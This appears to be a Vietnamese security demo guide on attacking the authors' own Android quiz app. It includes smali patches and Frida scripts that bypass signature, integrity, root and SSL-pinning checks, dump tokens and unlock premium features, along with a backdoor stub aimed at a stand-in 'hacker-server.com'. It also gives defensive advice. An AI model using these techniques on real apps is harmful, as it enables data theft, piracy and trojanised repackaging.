# 🔴 APK Attack Techniques - Security Demo Guide

> **⚠️ DISCLAIMER**: Tài liệu này chỉ dành cho mục đích giáo dục, penetration testing hợp pháp, và demo bảo mật. KHÔNG sử dụng cho mục đích bất hợp pháp.

## 📋 Mục lục
1. [Tổng quan về APK Security](#1-tổng-quan)
2. [Công cụ cần thiết](#2-công-cụ-cần-thiết)
3. [Kịch bản tấn công phổ biến](#3-kịch-bản-tấn-công)
4. [Demo Attack Scenarios](#4-demo-scenarios)
5. [Cách phòng chống](#5-cách-phòng-chống)

---

## 1. 🎯 Tổng quan về APK Security

### Điểm yếu cơ bản của APK:
- **APK là file ZIP** - có thể unzip và xem nội dung
- **DEX bytecode** có thể decompile về Java/Kotlin
- **Resources** (XML, assets) có thể đọc được
- **SharedPreferences** lưu dưới dạng XML plaintext
- **Network traffic** có thể intercept nếu không dùng certificate pinning

---

## 2. 🛠️ Công cụ cần thiết

### A. Decompilation Tools
```bash
# 1. APKTool - Decompile APK to Smali
apktool d app-release.apk -o output_folder

# 2. JADX - Decompile to Java source code
jadx app-release.apk -d output_folder

# 3. dex2jar - Convert DEX to JAR
d2j-dex2jar app-release.apk

# 4. JD-GUI - View decompiled Java code
# GUI tool to view .jar files
```

### B. Repackaging Tools
```bash
# 1. APKTool - Rebuild APK
apktool b output_folder -o modified.apk

# 2. jarsigner/apksigner - Sign APK
jarsigner -keystore my-key.keystore modified.apk alias_name
```

### C. Dynamic Analysis Tools
```bash
# 1. Frida - Runtime instrumentation
frida -U -f com.example.eduquizz -l script.js

# 2. Objection - Runtime mobile security toolkit
objection -g com.example.eduquizz explore

# 3. Charles Proxy / Burp Suite - Traffic interception
```

### D. Other Tools
- **ADB (Android Debug Bridge)** - Access device/emulator
- **Wireshark** - Network packet analysis
- **SQLite Browser** - View databases
- **Android Studio** - Build and test modified APKs

---

## 3. 🎭 Kịch bản tấn công phổ biến

### Attack Vector 1: **APK Decompilation & Source Code Analysis**

#### Mục tiêu:
- Đọc được source code logic
- Tìm API endpoints và secrets
- Phân tích thuật toán encryption
- Tìm hardcoded credentials

#### Các bước thực hiện:

**Bước 1: Lấy APK file**
```bash
# Từ device/emulator
adb shell pm list packages | grep eduquizz
adb shell pm path com.example.eduquizz
# Output: package:/data/app/~~xxxxx/com.example.eduquizz/base.apk

adb pull /data/app/~~xxxxx/com.example.eduquizz/base.apk eduquizz.apk
```

**Bước 2: Decompile APK**
```bash
# Method 1: APKTool (Smali format)
apktool d eduquizz.apk -o eduquizz_decompiled

# Method 2: JADX (Java format - dễ đọc hơn)
jadx eduquizz.apk -d eduquizz_source
```

**Bước 3: Phân tích code**
```bash
cd eduquizz_source/sources/com/example/eduquizz/

# Tìm API endpoints
grep -r "http://" .
grep -r "https://" .
grep -r "BASE_URL" .

# Tìm credentials
grep -r "password" .
grep -r "api_key" .
grep -r "token" .

# Tìm encryption logic
grep -r "AES" .
grep -r "encrypt" .
grep -r "decrypt" .
```

**Kết quả có thể tìm thấy:**
- ✅ API base URLs (ví dụ: `http://10.0.2.2:8080/api/`)
- ✅ API endpoints (`/auth/login`, `/auth/register`)
- ✅ JWT token handling logic
- ✅ Encryption keys (nếu hardcoded)
- ✅ SharedPreferences keys
- ✅ Database schema

---

### Attack Vector 2: **Bypass Authentication/Authorization**

#### Kịch bản: Modify APK để bypass login

**Bước 1: Decompile APK**
```bash
apktool d eduquizz.apk -o eduquizz_mod
```

**Bước 2: Tìm authentication logic**
```bash
cd eduquizz_mod
find . -name "*.smali" | xargs grep -l "login"
find . -name "*.smali" | xargs grep -l "verifyAppSignature"
```

**Bước 3: Modify Smali code**

Ví dụ: Trong `SignatureUtils.smali`, tìm method `verifyAppSignature`:
```smali
# Original code
.method public static verifyAppSignature(Landroid/content/Context;)Z
    # ... logic kiểm tra signature ...
    return v0  # return false nếu signature không khớp
.end method
```

**Modify thành:**
```smali
.method public static verifyAppSignature(Landroid/content/Context;)Z
    const/4 v0, 0x1  # Force return true
    return v0
.end method
```

**Bước 4: Rebuild và Sign APK**
```bash
# Rebuild
apktool b eduquizz_mod -o eduquizz_hacked.apk

# Generate signing key (nếu chưa có)
keytool -genkey -v -keystore hacker.keystore -alias hacker_key -keyalg RSA -keysize 2048 -validity 10000

# Sign APK
jarsigner -keystore hacker.keystore eduquizz_hacked.apk hacker_key

# Zipalign (optional, for optimization)
zipalign -v 4 eduquizz_hacked.apk eduquizz_final.apk
```

**Bước 5: Install và test**
```bash
adb uninstall com.example.eduquizz
adb install eduquizz_final.apk
```

**Kết quả:**
- ✅ App sẽ bypass signature verification
- ✅ Có thể chạy trên bất kỳ device nào, kể cả rooted device

---

### Attack Vector 3: **Extracting Sensitive Data**

#### A. Từ SharedPreferences/EncryptedSharedPreferences

**Trường hợp 1: Nếu app KHÔNG dùng encryption**
```bash
# Pull SharedPreferences files
adb shell "run-as com.example.eduquizz cat /data/data/com.example.eduquizz/shared_prefs/user_prefs.xml"

# Output có thể là:
# <string name="user_token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</string>
# <string name="user_email">admin@example.com</string>
```

**Trường hợp 2: Nếu app DÙNG EncryptedSharedPreferences**
```bash
# Pull encrypted file
adb pull /data/data/com.example.eduquizz/shared_prefs/__androidx_security_crypto_encrypted_prefs__.xml

# File sẽ encrypted, NHƯNG...
# Nếu device bị root, có thể extract master key từ Android Keystore
# Hoặc dùng Frida để hook và lấy decrypted data trong runtime
```

#### B. Từ SQLite Database

```bash
# Pull database
adb pull /data/data/com.example.eduquizz/databases/app_database.db

# Open bằng SQLite Browser
sqlite3 app_database.db
.tables
SELECT * FROM users;
SELECT * FROM quiz_results;
```

#### C. Sử dụng Frida để extract runtime data

**Script: `dump_prefs.js`**
```javascript
Java.perform(function() {
    var SharedPreferences = Java.use("android.content.SharedPreferences");
    var Context = Java.use("android.content.Context");
    
    // Hook getSharedPreferences
    Context.getSharedPreferences.overload('java.lang.String', 'int').implementation = function(name, mode) {
        console.log("[+] Loading SharedPreferences: " + name);
        var prefs = this.getSharedPreferences(name, mode);
        
        // Dump all keys
        var allEntries = prefs.getAll();
        var keys = allEntries.keySet();
        var iterator = keys.iterator();
        
        while(iterator.hasNext()) {
            var key = iterator.next();
            var value = allEntries.get(key);
            console.log("[+] " + key + " = " + value);
        }
        
        return prefs;
    };
});
```

**Chạy:**
```bash
frida -U -f com.example.eduquizz -l dump_prefs.js --no-pause
```

**Kết quả:**
- ✅ Có thể xem tất cả SharedPreferences data, kể cả encrypted
- ✅ Lấy được JWT tokens, user info, API keys

---

### Attack Vector 4: **Man-in-the-Middle (MITM) Attack**

#### Mục tiêu:
- Intercept HTTPS traffic
- Đọc request/response
- Modify data trước khi gửi đến server

#### Các bước:

**Bước 1: Setup Proxy (Charles/Burp Suite)**
```bash
# Install Charles Proxy
# Start Charles on computer (port 8888)

# Configure Android device
adb shell settings put global http_proxy <computer_ip>:8888
```

**Bước 2: Install CA Certificate trên Android**
```bash
# Export Charles root certificate
# Settings -> SSL Proxifying -> Install Charles Root Certificate

# Push to device
adb push charles-ssl-proxying-certificate.crt /sdcard/
# Settings -> Security -> Install from storage
```

**Bước 3: Bypass SSL Pinning (nếu app có implement)**

**Method 1: Sử dụng Frida script**
```javascript
// android_ssl_pinning_bypass.js
Java.perform(function() {
    // Hook OkHttp CertificatePinner
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
        console.log("[+] Bypassing SSL Pinning for: " + arguments[0]);
    };
    
    // Hook TrustManager
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    X509TrustManager.checkServerTrusted.implementation = function() {
        console.log("[+] Bypassing certificate validation");
    };
});
```

**Chạy:**
```bash
frida -U -f com.example.eduquizz -l android_ssl_pinning_bypass.js --no-pause
```

**Method 2: Modify APK to remove SSL Pinning**
```bash
# Decompile
apktool d eduquizz.apk -o eduquizz_mod

# Tìm và xóa certificate pinning config
# Trong network_security_config.xml:
# Xóa <pin-set> tags

# Rebuild và sign lại
```

**Kết quả:**
- ✅ Xem được tất cả API requests/responses
- ✅ Biết được data format, authentication headers
- ✅ Có thể modify request để test injection attacks

---

### Attack Vector 5: **Injecting Malicious Code**

#### Kịch bản: Thêm backdoor vào APK

**Bước 1: Decompile APK**
```bash
apktool d eduquizz.apk -o eduquizz_backdoor
```

**Bước 2: Tạo malicious payload**

Tạo file `Backdoor.smali`:
```smali
.class public Lcom/hacker/Backdoor;
.super Ljava/lang/Object;

.method public static sendData(Ljava/lang/String;)V
    .locals 1
    
    # Send user data to attacker's server
    # Code to make HTTP request to http://hacker-server.com/collect
    
    return-void
.end method
```

**Bước 3: Hook vào existing code**

Trong `MainActivity.smali`, tìm `onCreate` và thêm:
```smali
.method protected onCreate(Landroid/os/Bundle;)V
    # ... existing code ...
    
    # Inject backdoor
    invoke-static {}, Lcom/hacker/Backdoor;->sendData()V
    
    # ... continue existing code ...
.end method
```

**Bước 4: Rebuild, sign, và distribute**
```bash
apktool b eduquizz_backdoor -o eduquizz_malicious.apk
jarsigner -keystore hacker.keystore eduquizz_malicious.apk hacker_key
```

**Kết quả:**
- ✅ Mỗi khi user mở app, data sẽ được gửi về hacker's server
- ✅ User không biết gì vì app vẫn hoạt động bình thường

---

### Attack Vector 6: **Tampering with Resources**

#### Kịch bản: Modify UI, text, images

**Bước 1: Decompile**
```bash
apktool d eduquizz.apk -o eduquizz_mod
```

**Bước 2: Modify resources**
```bash
cd eduquizz_mod/res

# Modify strings
nano values/strings.xml
# Change: <string name="app_name">EduQuizz</string>
# To:     <string name="app_name">Hacked EduQuizz</string>

# Modify layouts
nano layout/activity_main.xml
# Add fake login fields, ads, etc.

# Replace images
cp /path/to/hacker_logo.png drawable/ic_logo.png
```

**Bước 3: Rebuild**
```bash
apktool b eduquizz_mod -o eduquizz_modded.apk
jarsigner -keystore hacker.keystore eduquizz_modded.apk hacker_key
```

**Kết quả:**
- ✅ Fake login screens để phishing
- ✅ Inject quảng cáo
- ✅ Change pricing information

---

### Attack Vector 7: **Premium Feature Unlocking**

#### Kịch bản: Bypass in-app purchase

**Bước 1: Tìm premium check logic**
```bash
jadx eduquizz.apk -d source
cd source
grep -r "isPremium" .
grep -r "hasPurchased" .
```

**Bước 2: Modify logic**

Giả sử tìm thấy trong `UserViewModel.kt`:
```kotlin
// Original
fun isPremiumUser(): Boolean {
    return purchaseManager.hasPurchased("premium_package")
}
```

Decompiled Smali sẽ có dạng:
```smali
.method public isPremiumUser()Z
    # ... check purchase ...
    return v0  # v0 = purchase status
.end method
```

**Modify thành:**
```smali
.method public isPremiumUser()Z
    const/4 v0, 0x1  # Always return true
    return v0
.end method
```

**Kết quả:**
- ✅ Unlock tất cả premium features miễn phí

---

### Attack Vector 8: **Dynamic Runtime Manipulation với Frida**

#### Kịch bản: Modify app behavior trong runtime mà KHÔNG cần rebuild APK

**Script: `bypass_all_checks.js`**
```javascript
Java.perform(function() {
    console.log("[*] Starting runtime manipulation...");
    
    // 1. Bypass signature check
    var SignatureUtils = Java.use("com.example.eduquizz.security.SignatureUtils");
    SignatureUtils.verifyAppSignature.implementation = function(context) {
        console.log("[+] Bypassing signature verification");
        return true;
    };
    
    // 2. Bypass Play Integrity check
    var PlayIntegrity = Java.use("com.example.eduquizz.security.PlayIntegrityHelper");
    PlayIntegrity.checkIntegrity.implementation = function(context, callback) {
        console.log("[+] Bypassing Play Integrity check");
        var JSONObject = Java.use("org.json.JSONObject");
        var fakeJson = JSONObject.$new();
        callback.onResult(true, fakeJson);
    };
    
    // 3. Bypass root detection (if exists)
    var RootDetection = Java.use("com.example.eduquizz.security.RootDetection");
    RootDetection.isDeviceRooted.implementation = function() {
        console.log("[+] Bypassing root detection");
        return false;
    };
    
    // 4. Dump JWT tokens
    var TokenManager = Java.use("com.example.eduquizz.security.TokenManager");
    TokenManager.getToken.implementation = function() {
        var token = this.getToken();
        console.log("[+] JWT Token: " + token);
        return token;
    };
    
    // 5. Hook API calls
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    OkHttpClient.newCall.implementation = function(request) {
        console.log("[+] API Call: " + request.url());
        console.log("[+] Headers: " + request.headers());
        return this.newCall(request);
    };
});
```

**Chạy:**
```bash
frida -U -f com.example.eduquizz -l bypass_all_checks.js --no-pause
```

**Kết quả:**
- ✅ Bypass tất cả security checks trong runtime
- ✅ Không cần modify APK
- ✅ Có thể dump tất cả sensitive data

---

## 4. 🎬 Demo Scenarios cho Giám Khảo

### Demo 1: "Extracting API Credentials"

**Chuẩn bị:**
1. APK của EduQuizzApp
2. JADX GUI đã cài đặt

**Script demo:**
```
1. Mở JADX GUI
2. Load eduquizz.apk
3. Tìm trong project tree: com.example.eduquizz.network
4. Mở RetrofitClient.kt hoặc ApiService.kt
5. CHỈ ra BASE_URL, API endpoints
6. Tìm kiếm "Authorization" header
7. Show được JWT token format
8. Giải thích: "Đây là thông tin nhạy cảm mà hacker có thể lấy được trong 5 phút"
```

### Demo 2: "Bypassing Login with Modified APK"

**Chuẩn bị:**
1. APK gốc
2. APKTool
3. Text editor
4. Modified APK đã build sẵn

**Script demo:**
```
1. Show APK gốc: "App yêu cầu login"
2. Chạy lệnh: apktool d eduquizz.apk
3. Show Smali code của authentication logic
4. Modify: Thay return false -> return true
5. Rebuild: apktool b eduquizz_mod -o hacked.apk
6. Sign: jarsigner...
7. Install modified APK
8. Run app: "Login đã được bypass, vào app mà không cần credentials"
```

### Demo 3: "Intercepting HTTPS Traffic"

**Chuẩn bị:**
1. Charles Proxy running
2. Android emulator/device với CA cert đã install
3. EduQuizzApp

**Script demo:**
```
1. Show Charles Proxy interface
2. Start recording
3. Mở app EduQuizzApp
4. Thực hiện login
5. Show trong Charles: Request với username/password cleartext (hoặc JWT)
6. Show Response: User data, tokens
7. Giải thích: "Nếu không có SSL pinning, tất cả data có thể bị đọc"
```

### Demo 4: "Runtime Manipulation với Frida"

**Chuẩn bị:**
1. Frida server chạy trên device
2. Frida script sẵn sàng
3. App running

**Script demo:**
```
1. Show app với premium features locked
2. Run: frida -U -f com.example.eduquizz -l unlock_premium.js
3. Show console output: "Hooking isPremiumUser()..."
4. Trong app: Premium features giờ đã unlocked
5. Giải thích: "Không cần modify APK, chỉ cần runtime hook"
```

---

## 5. 🛡️ Cách phòng chống

### Level 1: Basic Protection (Đã có trong project)
- ✅ **ProGuard/R8 Obfuscation** - Làm khó reverse engineering
- ✅ **Code Signing** - Phát hiện APK bị repackage
- ✅ **HTTPS** - Encrypt network traffic

### Level 2: Advanced Protection (Có code nhưng chưa bật)
- 🔄 **Signature Verification** - Bật lại trong MainActivity
- 🔄 **Play Integrity API** - Bật lại trong MainActivity  
- 🔄 **Anti-Debugging** - Bật lại trong MainActivity

### Level 3: Expert Protection (Nên thêm)

#### A. Root Detection
```kotlin
object RootDetection {
    fun isDeviceRooted(): Boolean {
        // Check for su binary
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su"
        )
        return paths.any { File(it).exists() }
    }
}
```

#### B. Certificate Pinning
```kotlin
// In OkHttpClient builder
val certificatePinner = CertificatePinner.Builder()
    .add("yourdomain.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .build()

val client = OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build()
```

#### C. Native Code Protection
```cpp
// Store sensitive logic trong C/C++ NDK
// Khó decompile hơn so với Java/Kotlin
```

#### D. Runtime Integrity Checks
```kotlin
// Check if app is running under Frida/Xposed
fun detectFrida(): Boolean {
    val devices = File("/proc/net/tcp").readLines()
    return devices.any { it.contains("27042") } // Frida default port
}
```

#### E. String Encryption
```kotlin
// KHÔNG hardcode strings
// Sử dụng encryption cho sensitive strings
object SecureStrings {
    fun getApiKey(): String {
        return decrypt("encrypted_base64_string")
    }
}
```

---

## 📊 So sánh Security Levels

| Protection Level | Effort to Attack | Tools Required | Time to Breach |
|-----------------|------------------|----------------|----------------|
| **No Protection** | Very Easy | APKTool only | < 10 minutes |
| **Basic (ProGuard)** | Easy | APKTool + JADX | < 30 minutes |
| **Advanced (Signature + Integrity)** | Medium | Frida + Root | 1-2 hours |
| **Expert (Multiple Layers)** | Hard | Advanced tools + Skills | Days to Weeks |
| **Enterprise (Native + Obfuscation)** | Very Hard | Expert skills required | Weeks to Months |

---

## 🎓 Kết luận cho Demo

### Message cho Giám Khảo:

> **"Android APK security là một cuộc chạy đua vũ trang giữa attackers và defenders."**

**Không có giải pháp 100% an toàn**, nhưng có thể làm cho việc tấn công:
1. ⏰ **Mất nhiều thời gian hơn**
2. 💰 **Tốn kém hơn**
3. 🎓 **Yêu cầu kỹ năng cao hơn**
4. ⚖️ **Rủi ro pháp lý cao hơn**

### App EduQuizzApp hiện tại:
- ✅ Có **foundation tốt** với ProGuard + Security infrastructure
- ⚠️ Cần **bật lại** các security checks
- 🚀 Nên **thêm** root detection, certificate pinning, và runtime checks

### Defense in Depth Strategy:
```
Layer 1: Code Obfuscation (ProGuard) ✅
Layer 2: Signature Verification 🔄 (có nhưng chưa bật)
Layer 3: Play Integrity API 🔄 (có nhưng chưa bật)
Layer 4: Root Detection ❌ (chưa có)
Layer 5: SSL Pinning ❌ (chưa có)
Layer 6: Runtime Protection ❌ (chưa có)
Layer 7: Anti-Debugging 🔄 (có nhưng chưa bật)
```

---

## 📚 Tài liệu tham khảo

- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
- [Android Security Documentation](https://source.android.com/security)
- [Frida Documentation](https://frida.re/docs/home/)
- [APKTool Documentation](https://ibotpeaches.github.io/Apktool/)

---

**Created for educational and security demo purposes**  
**Last updated:** 2025-12-26
